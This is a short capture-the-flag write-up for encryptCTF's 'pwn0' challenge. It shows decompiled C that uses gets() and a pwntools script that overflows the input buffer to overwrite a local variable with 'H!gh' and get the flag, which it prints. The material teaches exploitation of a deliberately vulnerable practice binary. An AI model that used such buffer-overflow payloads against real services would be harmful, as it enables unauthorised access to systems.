## pwn0 (Pwn, 25pts)

#### Challenge Description

How's the josh?

```
nc 104.154.106.182 1234
```

author: codacker

#### Overview

When we decompile the main entry point of the binary the challenge gives us, we essentially get the following:

```c
setvbuf(stdout, 0, 2, 0);
puts("How's the josh?");
gets(&s);
if ( !memcmp(&s1, "H!gh", 4u) )
{
    puts("Good! here's the flag");
    print_flag();
}
else
{
    puts("Your josh is low!\nBye!");
}
```

We can abuse `gets()` to overwrite the memory contents of the local variable `s1` to match `H1gh`. Another way you could solve it would be to overwrite the return address to point directly to `print_flag()`, but it's not necessary.

#### Flag Script

```python
# Pwn0
# No PIE, NX Enabled, No Stack Cookies
#
# Solution: Overwrite local variable with "H!gh"
# Flag: encryptCTF{L3t5_R4!53_7h3_J05H}

from pwn import *

context(arch='i386', os='linux')

io = remote('104.154.106.182', 1234)

payload = "H!gh" * 50

# Receive prompt
io.recv()
io.sendline(payload)

# Receive irrelevant statement / trash
io.recv()

# Flag
print(io.recv())
```

The flag:

```
encryptCTF{L3t5_R4!53_7h3_J05H}
```
